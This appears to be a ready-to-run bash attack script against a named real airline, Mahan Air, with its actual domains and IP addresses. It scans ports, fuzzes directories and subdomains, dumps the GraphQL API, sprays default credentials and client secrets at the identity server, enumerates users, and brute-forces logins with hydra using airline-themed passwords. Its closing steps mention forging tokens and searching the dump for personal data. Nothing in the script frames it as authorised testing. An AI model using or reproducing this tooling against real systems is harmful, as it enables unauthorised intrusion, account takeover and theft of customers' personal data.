#!/bin/bash
# ============================================================
# Mahan Air — Advanced Attack Suite (Kali Linux)
# الاستخدام: chmod +x mahan_attack.sh && ./mahan_attack.sh
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log() { echo -e "${CYAN}[*]${NC} $1"; }
ok()  { echo -e "${GREEN}[+]${NC} $1"; }
fail(){ echo -e "${RED}[-]${NC} $1"; }
warn(){ echo -e "${YELLOW}[!]${NC} $1"; }

DOMAIN="www.mahanair.co.ir"
ID="id.mahanair.co.ir"
CONTENT="content.mahanair.co.ir"
BOOKING="reservations.mahan.aero"
IP="5.160.223.83"
ID_IP="5.160.223.34"
OUTDIR="mahan_results"

mkdir -p "$OUTDIR"
cd "$OUTDIR"

# ============================================================
# 1. NETWORK RECON
# ============================================================
section_network() {
    log "=== 1. NETWORK RECON ==="
    
    # Port scan (common ports, non-aggressive)
    nmap -sS -T4 -p 80,443,8080,8443,9443,9080,9043,9090,5601,9200,22,21,25,143,993,3306,3389,5432,6379 \
        --open -oN nmap_scan.txt "$IP" 2>/dev/null
    ok "nmap done → nmap_scan.txt"
    
    # Version scan on key ports
    nmap -sV -T4 -p 80,443,8080,8443,9080,9043 --script=http-headers,ssl-enum-ciphers \
        -oN nmap_versions.txt "$IP" 2>/dev/null
    ok "Version detection → nmap_versions.txt"
    
    # ID server scan
    nmap -sS -T4 -p 80,443,5000,5001,8080,8443 --open -oN nmap_id.txt "$ID_IP" 2>/dev/null
    ok "ID server scan → nmap_id.txt"
    
    # Subdomain enumeration (wordlist)
    if [ -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt ]; then
        wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
            -H "Host: FUZZ.mahanair.co.ir" --hw 0 -t 50 --timeout 5 \
            -o csv -f subdomains.csv "https://$IP" 2>/dev/null
        ok "Subdomain fuzz done → subdomains.csv"
    else
        warn "Seclists not found, skipping subdomain fuzz"
    fi
}

# ============================================================
# 2. WEB APPLICATION RECON
# ============================================================
section_webrecon() {
    log "=== 2. WEB APPLICATION RECON ==="
    
    # WhatWeb fingerprinting
    whatweb -a 3 "https://$DOMAIN" --log-verbose=whatweb_main.txt 2>/dev/null
    whatweb -a 3 "https://$ID" --log-verbose=whatweb_id.txt 2>/dev/null
    whatweb -a 3 "https://$CONTENT/api/graphql" --log-verbose=whatweb_content.txt 2>/dev/null
    ok "WhatWeb fingerprinting done"
    
    # Directory fuzzing (main site)
    if [ -f /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt ]; then
        ffuf -u "https://$DOMAIN/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
            -fc 404,301 -t 50 -o fuzz_main.json 2>/dev/null
        ok "Directory fuzz → fuzz_main.json"
    fi
    
    # API endpoints fuzzing
    if [ -f /usr/share/wordlists/seclists/Discovery/Web-Content/api.txt ]; then
        ffuf -u "https://$DOMAIN/api/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/api.txt \
            -fc 404,301 -t 30 -o fuzz_api.json 2>/dev/null
        ok "API fuzz → fuzz_api.json"
    fi
    
    # SSL/TLS analysis
    testssl "https://$DOMAIN" --quiet --htmlfile ssl_main.html 2>/dev/null
    testssl "https://$ID" --quiet --htmlfile ssl_id.html 2>/dev/null
    ok "SSL analysis done"
}

# ============================================================
# 3. GRAPHQL EXPLOITATION (content.mahanair.co.ir)
# ============================================================
section_graphql() {
    log "=== 3. GRAPHQL EXPLOITATION ==="
    GQL_URL="https://$CONTENT/api/graphql"
    
    # Full schema dump
    curl -s "$GQL_URL" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{__schema{types{kind name description fields{name description args{name description type{name kind ofType{name kind}}}type{name kind ofType{name kind}}isDeprecated}}}"}' \
        -o gql_schema.json
    ok "Full schema → gql_schema.json"
    
    # Try GraphQL introspection query (alternative format)
    curl -s "$GQL_URL" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"query{__schema{queryType{name}mutationType{name}types{name fields{name type{name}}}}}"}' \
        -o gql_introspect.json
    ok "Introspection → gql_introspect.json"
    
    # Query ALL data types
    for dtype in news magazine salesOffice terminal announcement medicalLaboratory \
                 blog blogTopic story faqTopic faqItem fleet route airport city country \
                 currency weather meal bank gender agent setting page; do
        curl -s "$GQL_URL" -X POST \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"{$dtype{displayText}}\"}" \
            -o "gql_${dtype}.json" &
    done
    wait
    ok "All content types dumped"
    
    # Check for GraphQL batching / nested attacks
    curl -s "$GQL_URL" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' \
        | python3 -c "import json,sys;d=json.load(sys.stdin);types=[t['name'] for t in d.get('data',{}).get('__schema',{}).get('types',[]) if not t['name'].startswith('__')];print(f'Custom types: {len(types)}');print('\n'.join(types))" \
        > gql_types.txt
    ok "Custom types list → gql_types.txt"
    
    # Try GraphQL mutation discovery
    curl -s "$GQL_URL" -X POST \
        -H "Content-Type: application/json" \
        -d '{"query":"{__schema{mutationType{name fields{name args{name type{name}}}}}}"}' \
        -o gql_mutations.json
    ok "Mutations checked → gql_mutations.json"
}

# ============================================================
# 4. IDENTITY SERVER ATTACKS (id.mahanair.co.ir)
# ============================================================
section_identity() {
    log "=== 4. IDENTITY SERVER ATTACKS ==="
    
    # Get OpenID configuration
    curl -s "https://$ID/.well-known/openid-configuration" -o oidc_config.json
    ok "OIDC config → oidc_config.json"
    
    # Get JWKS keys
    curl -s "https://$ID/.well-known/openid-configuration/jwks" -o jwks.json
    ok "JWKS keys → jwks.json"
    
    # Try password grant with default credentials
    log "Trying password grant..."
    for cred in "admin:admin" "admin:123456" "admin:password" "test:test" \
                "user:user" "demo:demo" "info@mahan.aero:123456" \
                "fare@mahan.aero:123456" "admin@mahanair.co.ir:admin"; do
        user=$(echo "$cred" | cut -d: -f1 | sed 's/@/%40/g')
        pass=$(echo "$cred" | cut -d: -f2)
        resp=$(curl -s "https://$ID/connect/token" -X POST \
            -d "grant_type=password&username=$user&password=$pass&client_id=website&scope=openid%20profile%20email" \
            -w "\n%{http_code}")
        code=$(echo "$resp" | tail -1)
        if [ "$code" != "400" ]; then
            ok "  $cred → HTTP $code: $(echo "$resp" | head -1 | cut -c1-100)"
        fi
    done
    
    # Try client_secret guessing
    log "Trying client secret guessing..."
    for secret in "website" "secret" "admin" "mahan" "mahanair" "123456" \
                  "password" "web" "mahan.aero" "Mahan@123"; do
        resp=$(curl -s "https://$ID/connect/token" -X POST \
            -d "grant_type=client_credentials&client_id=website&client_secret=$secret&scope=openid%20profile%20email" \
            -w "\n%{http_code}")
        code=$(echo "$resp" | tail -1)
        if [ "$code" == "200" ]; then
            ok "  client_secret FOUND: $secret → TOKEN: $(echo "$resp" | head -1 | cut -c1-80)"
            echo "$resp" | head -1 > client_credentials_token.txt
            break
        fi
    done
    
    # Try introspect endpoint with common tokens
    log "Trying introspection (token validation)..."
    for token in "test" "admin" "website" "mahan"; do
        resp=$(curl -s "https://$ID/connect/introspect" -X POST \
            -d "token=$token&client_id=website&client_secret=website" \
            -w "\n%{http_code}")
        code=$(echo "$resp" | tail -1)
        if [ "$code" == "200" ]; then
            ok "  Token $token → $(echo "$resp" | head -1)"
        fi
    done
    
    # Registration API discovery
    log "Trying registration endpoints..."
    for ep in "/api/account/register" "/Account/Register" "/api/users" \
              "/api/accounts" "/signup" "/api/signup"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "https://$ID$ep" -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"test@test.com","password":"Test@123"}')
        ok "  POST $ep → HTTP $code"
    done
    
    # User enumeration via login/register endpoints
    log "User enumeration..."
    for user in "admin" "info" "support" "fare" "test" "user" "mahan"; do
        email="${user}@mahan.aero"
        # Try register with existing email
        code=$(curl -s -o /dev/null -w "%{http_code}" "https://$ID/Account/Register" \
            -X POST -d "Email=$email&Password=Test@123&ConfirmPassword=Test@123")
        # Try forgot password
        fp_resp=$(curl -s "https://$ID/Account/ForgotPassword" -X POST \
            -d "Email=$email" \
            -w "\n%{http_code}")
        fp_code=$(echo "$fp_resp" | tail -1)
        fp_len=$(echo "$fp_resp" | head -1 | wc -c)
        echo "$email → Register:$code Forgot:$fp_code($fp_len)"
    done > user_enum.txt
    ok "User enumeration → user_enum.txt"
}

# ============================================================
# 5. BOOKING ENGINE (reservations.mahan.aero)
# ============================================================
section_booking() {
    log "=== 5. BOOKING ENGINE ==="
    
    # Try to access the booking engine over HTTPS
    resp=$(curl -sk --connect-timeout 10 "https://$BOOKING/" -w "\n%{http_code}" 2>&1)
    code=$(echo "$resp" | tail -1)
    body=$(echo "$resp" | head -1)
    ok "Booking HTTPS → HTTP $code"
    
    # DNS resolution check
    dig +short "$BOOKING" A > booking_dns.txt
    ok "Booking DNS → $(cat booking_dns.txt)"
    
    # Try different booking URLs
    for path in "/" "/ibe" "/reservation" "/booking" "/fare" \
                "/service-app/ibe/reservation.html" \
                "/service-app" "/api" "/health" "/status"; do
        code=$(curl -sk --connect-timeout 8 -o /dev/null -w "%{http_code}" "https://$BOOKING$path" 2>&1)
        ok "  $path → HTTP $code"
    done
    
    # F5 BIG-IP cookie test
    curl -sk --connect-timeout 8 "https://$BOOKING/" -D - -o /dev/null 2>&1 | head -20 > booking_headers.txt
    ok "Booking headers → booking_headers.txt"
}

# ============================================================
# 6. WEBSPHERE SPECIFIC TESTS
# ============================================================
section_websphere() {
    log "=== 6. WEBSPHERE TESTS ==="
    
    # Test for WebSphere console
    for path in "/ibm/console" "/ibm/console/logon.jsp" "/wps/portal" \
                "/admin" "/admincenter" "/websphere" "/snoop" \
                "/wsadmin" "/IBM/WebServices" "/ibm/console/secure" \
                "/ibm/console/standard" "/console" "/admin/secure"; do
        code=$(curl -sk --connect-timeout 5 -o /dev/null -w "%{http_code}" "https://$DOMAIN$path")
        if [ "$code" != "200" ] && [ "$code" != "301" ] && [ "$code" != "302" ]; then
            continue
        fi
        ok "  $path → HTTP $code"
    done
    
    # Test for WebSphere vulnerabilities
    # CVE-2020-4450 (XXE)
    curl -sk "https://$DOMAIN/ibm/console/com.ibm.ws.console.core/WSAdmin" -o /dev/null -w "CVE-2020-4450 test: %{http_code}\n"
    
    # Test for WebSphere CSRF
    curl -sk "https://$DOMAIN/ibm/console/standard" -D - -o /dev/null 2>&1 | grep -i "csrf\|token\|LtpaToken" > websphere_tokens.txt
    
    ok "WebSphere tests done"
}

# ============================================================
# 7. ORCHARD CMS TESTS (content.mahanair.co.ir)
# ============================================================
section_orchard() {
    log "=== 7. ORCHARD CMS TESTS ==="
    
    # Check for Orchard-specific endpoints
    for path in "/api/graphql" "/odata" "/admin" "/Admin" \
                "/OrchardCore" "/api/content" "/api/odata" \
                "/.well-known" "/meta" "/healthz" "/Lombiq"; do
        code=$(curl -sk --connect-timeout 5 -o /dev/null -w "%{http_code}" \
            "https://$CONTENT$path")
        ok "  $path → HTTP $code"
    done
    
    # Try media access
    curl -sk "https://$CONTENT/media" -o /dev/null -w "Media root: %{http_code}\n"
    
    # Try Orchard-specific vulnerabilities
    # OrchardRC1-1 (Razor code execution) 
    # OrchardCore directory traversal
    ok "Orchard CMS tests done"
}

# ============================================================
# 8. DATA EXFIL - Full GraphQL Dump
# ============================================================
section_dump() {
    log "=== 8. FULL DATA DUMP ==="
    GQL_URL="https://$CONTENT/api/graphql"
    
    # Extract all content types from schema and dump them
    python3 << 'PYEOF'
import json, urllib.request, urllib.error, sys

gql_url = "https://content.mahanair.co.ir/api/graphql"

def query(q):
    req = urllib.request.Request(gql_url,
        data=json.dumps({'query': q}).encode(),
        headers={'Content-Type': 'application/json'})
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return json.loads(r.read().decode())
    except Exception as e:
        return {'error': str(e)}

# Get all queryable types
schema = query("{__schema{queryType{fields{name}}}}")
fields = schema.get('data',{}).get('__schema',{}).get('queryType',{}).get('fields',[])
if not fields:
    # Try alternative schema query
    schema = query("{__schema{types{name kind fields{name}}}}")
    if 'data' in schema:
        for t in schema['data'].get('__schema',{}).get('types',[]):
            if t.get('name') == 'Query':
                fields = t.get('fields', [])
                break

dump = {}
for f in fields:
    name = f['name']
    if name.startswith('__'):
        continue
    print(f"Dumping {name}...")
    result = query(f"{{{name}{{displayText}}}}")
    dump[name] = result.get('data', {}).get(name, [])
    if dump[name]:
        print(f"  -> {len(dump[name])} items")

json.dump(dump, open('full_data_dump.json', 'w'), ensure_ascii=False, indent=2)
print(f"\nTotal: {sum(len(v) for v in dump.values())} items across {len(dump)} types")
PYEOF
    
    ok "Full data dump → full_data_dump.json"
}

# ============================================================
# 9. AUTH TOKEN ATTACKS
# ============================================================
section_tokens() {
    log "=== 9. TOKEN ATTACKS ==="
    
    # Test RS256 key confusion (if we can find public key usage)
    python3 << 'PYEOF'
import json

# Load JWKS keys
jwks = json.load(open('jwks.json'))
keys = jwks.get('keys', [])
print(f"Found {len(keys)} RSA keys:")
for k in keys:
    kid = k.get('kid', 'none')
    n_len = len(k.get('n', ''))
    print(f"  kid={kid}, n_len={n_len} bits")
PYEOF
    
    # Check for public key in source
    grep -r "BEGIN PUBLIC KEY\|MIICIjAN\|MIGfMA0GCSqGSIb3" ../ 2>/dev/null > public_keys_found.txt
    ok "Public key search done"
    
    # JWT none algorithm attack
    echo "Check for JWT alg:none attacks:" > jwt_notes.txt
    echo "Try modifying JWT token alg from RS256 to 'none'" >> jwt_notes.txt
    echo "Tool: https://github.com/ticarpi/jwt_tool" >> jwt_notes.txt
    ok "JWT attack notes → jwt_notes.txt"
}

# ============================================================
# 10. WORDLIST ATTACK - Password Grant
# ============================================================
section_password_bruteforce() {
    log "=== 10. PASSWORD BRUTE FORCE ==="
    
    # Generate wordlist from data we have
    echo "123456" > pass_list.txt
    echo "password" >> pass_list.txt
    echo "admin" >> pass_list.txt
    echo "Mahan@1403" >> pass_list.txt
    echo "Mahan@1402" >> pass_list.txt
    echo "Mahan1403" >> pass_list.txt
    echo "mahan1403" >> pass_list.txt
    echo "mahanair" >> pass_list.txt
    echo "Mahanair" >> pass_list.txt
    echo "Tehran@1403" >> pass_list.txt
    echo "Iran@1403" >> pass_list.txt
    echo "Mahan@123" >> pass_list.txt
    echo "Mahan#1403" >> pass_list.txt
    echo "airline" >> pass_list.txt
    echo "flymahan" >> pass_list.txt
    echo "FlyMahan" >> pass_list.txt
    
    # Try using hydra (if available)
    if command -v hydra &> /dev/null; then
        log "Running hydra against ID server..."
        # Note: hydra for OAuth needs custom module; here we try form-based login
        hydra -f -l "admin" -P pass_list.txt \
            "https://$ID/Account/Login" \
            -m "POST" -F "Email=^USER^&Password=^PASS^&button=login" \
            -o hydra_results.txt 2>&1 | tail -5
        ok "Hydra done → hydra_results.txt"
    else
        warn "hydra not installed, install with: apt install hydra"
    fi
}

# ============================================================
# 11. RECON SUMMARY
# ============================================================
section_summary() {
    log "=== SUMMARY ==="
    
    echo ""
    echo "=============================="
    echo "  MAHAN AIR RECON SUMMARY"
    echo "=============================="
    echo ""
    echo "Target: https://www.mahanair.co.ir"
    echo "IP: $IP (WebSphere + React SPA)"
    echo "ID Server: $ID ($ID_IP, Duende IdentityServer)"
    echo "Content API: $CONTENT (Orchard CMS + GraphQL)"
    echo "Booking: $BOOKING (F5 BIG-IP + nginx)"
    echo ""
    echo "Results directory: $OUTDIR"
    echo ""
    
    # Count results
    gql_count=$(find . -name "gql_*.json" 2>/dev/null | wc -l)
    nmap_count=$(find . -name "nmap_*.txt" 2>/dev/null | wc -l)
    echo "Files generated:"
    ls -lah *.json *.txt 2>/dev/null | awk '{print "  " $NF " (" $5 ")"}'
    echo ""
    
    echo "=== NEXT STEPS ==="
    echo "1. Check hydra_results.txt for passwords"
    echo "2. Check client_credentials_token.txt for API access"
    echo "3. Review gql_schema.json for sensitive fields"
    echo "4. Try token forging with jwks.json (kid confusion)"
    echo "5. Check full_data_dump.json for PII"
    echo "6. Test booking engine from Iranian IP"
    echo "=============================="
}

# ============================================================
# MAIN EXECUTION
# ============================================================

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    warn "Some scans (nmap SYN) need root. Run with sudo for best results."
fi

# Install missing tools if needed
# apt install -y nmap whatweb ffuf wfuzz testssl.js hydra curl jq 2>/dev/null

section_network
section_webrecon
section_graphql
section_identity
section_booking
section_websphere
section_orchard
section_dump
section_tokens
section_password_bruteforce
section_summary

echo ""
echo -e "${GREEN}All done! Check $OUTDIR for results.${NC}"
echo "Commands to run next:"
echo "  cat $OUTDIR/client_credentials_token.txt"
echo "  cat $OUTDIR/hydra_results.txt"
echo "  python3 -m json.tool $OUTDIR/gql_schema.json | less"
